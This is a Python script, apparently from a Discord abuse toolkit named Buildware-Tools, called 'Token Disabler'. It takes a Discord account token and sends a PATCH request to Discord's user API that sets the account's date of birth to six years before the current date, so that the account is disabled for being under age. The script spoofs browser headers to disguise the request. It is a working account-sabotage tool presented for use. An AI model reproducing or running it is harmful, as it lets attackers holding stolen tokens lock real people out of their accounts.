# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Core.Utils import *
from Core.Config import *

try:
    from datetime import datetime
    import requests
except Exception as e:
    MissingModule(e)

Title("Token Disabler")

Scroll(GradientBanner(discord_banner))

try:
    token = ChoiceToken()

    print(f"{LOADING} Disabling..", reset)

    now        = datetime.now()
    birth_date = f"{now.year - 6}-{str(now.month).zfill(2)}-12"

    headers = {
        "accept"          : "*/*",
        "accept-language" : "en-US",
        "authorization"   : token,
        "content-type"    : "application/json",
        "user-agent"      : RandomUserAgents(),
        "sec-ch-ua"       : '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        "sec-ch-ua-mobile": "?0",
        "x-debug-options" : "bugReporterEnabled",
    }

    try:
        response = requests.patch(
            "https://discord.com/api/v9/users/@me",
            headers=headers,
            json={"date_of_birth": birth_date},
            timeout=10
        )

        if response.status_code == 200:
            print(f"{SUCCESS} Token disabled!", reset)
        elif response.status_code == 401:
            print(f"{ERROR} Invalid token!", reset)
        elif response.status_code == 429:
            retry = response.json().get("retry_after", 1)
            print(f"{ERROR} Rate limited!", reset)
        else:
            print(f"{ERROR} Could not disable token!", reset)

    except requests.exceptions.Timeout:
        print(f"{ERROR} Request timed out!", reset)
    except Exception:
        print(f"{ERROR} Could not disable token!", reset)

    Continue()
    Reset()

except Exception as e:
    Error(e)